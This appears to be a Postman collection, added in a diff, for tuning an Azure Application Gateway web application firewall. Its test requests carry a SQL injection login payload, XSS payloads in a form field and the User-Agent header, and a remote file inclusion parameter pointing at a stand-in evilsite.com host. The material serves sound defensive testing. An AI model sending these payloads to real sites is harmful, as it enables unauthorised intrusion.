@@ -1,0 +1,191 @@
+{
+	"info": {
+		"_postman_id": "47101d26-37cf-40bb-aa56-0f8a2135235d",
+		"name": "Azure WAF Tuning - Application Gateway",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "9790016"
+	},
+	"item": [
+		{
+			"name": "Request Arg Keys/Names & Request Arg Values (JSON entity)",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"exec": [
+							""
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "POST",
+				"header": [
+					{
+						"key": "",
+						"value": "",
+						"type": "text",
+						"disabled": true
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n    \"properties\": {\r\n        \"credentials\": {\r\n            \"emai.l=l\": \"admin\",\r\n            \"password\": \"' or 1=1--\"\r\n        }\r\n    }\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://{{domain}}/rest/user/login",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"rest",
+						"user",
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Arg Keys/Names & Request Arg Values (Form-Data)",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "formdata",
+					"formdata": [
+						{
+							"key": "captcha",
+							"value": "98",
+							"type": "text"
+						},
+						{
+							"key": "captchaId",
+							"value": "0",
+							"type": "text"
+						},
+						{
+							"key": "comment",
+							"value": "<iframe src=\"x-javascript&colon;alert(`xss`)\">",
+							"type": "text"
+						},
+						{
+							"key": "rating",
+							"value": "3",
+							"type": "text"
+						},
+						{
+							"key": "emai'.l=l",
+							"value": "admin@juicesh-op.com",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://{{domain}}/contact",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"contact"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Arg Values /Custom rule (URL query string)",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://{{domain}}/about?page=http://evilsite.com/evilcode.php&OR%h2%=gyJ*WFIUW&viewid=hrTHWPWjiosEjkdjewkEW",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"about"
+					],
+					"query": [
+						{
+							"key": "page",
+							"value": "http://evilsite.com/evilcode.php"
+						},
+						{
+							"key": "OR%h2%",
+							"value": "gyJ*WFIUW"
+						},
+						{
+							"key": "viewid",
+							"value": "hrTHWPWjiosEjkdjewkEW"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request Header Value",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "User-Agent",
+						"value": "<script>alert(1)</script>",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "http://{{domain}}/search",
+					"protocol": "http",
+					"host": [
+						"{{domain}}"
+					],
+					"path": [
+						"search"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "domain",
+			"value": "",
+			"type": "string"
+		}
+	]
+}
